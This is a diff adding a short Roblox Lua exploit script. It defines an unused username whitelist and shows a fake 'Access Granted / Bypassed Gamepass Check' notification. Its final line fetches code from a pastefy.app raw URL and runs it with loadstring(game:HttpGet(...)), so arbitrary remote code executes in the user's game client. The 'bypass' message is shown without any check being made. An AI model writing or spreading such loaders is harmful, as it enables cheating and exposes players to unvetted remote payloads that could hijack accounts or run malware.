@@ -1,0 +1,21 @@
+local function is(name)
+    for _, v in pairs({
+        "Hecker_cousin", "kufkflrir", "UgcScripterNoob",
+        "mipanikon", "Rockerkeira", "hanakoiq1",
+        "kiffynianoo", "Zoro61252", "hazaikyk",
+        "Killer_Pro95872", "etnomaz"
+    }) do
+        if v:lower() == name:lower() then
+            return true
+        end
+    end
+    return false
+end
+
+game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "Access Granted",
+    Text = "Bypassed Gamepass Check",
+    Duration = 11
+})
+
+loadstring(game:HttpGet("https://pastefy.app/BDSkYR36/raw"))()
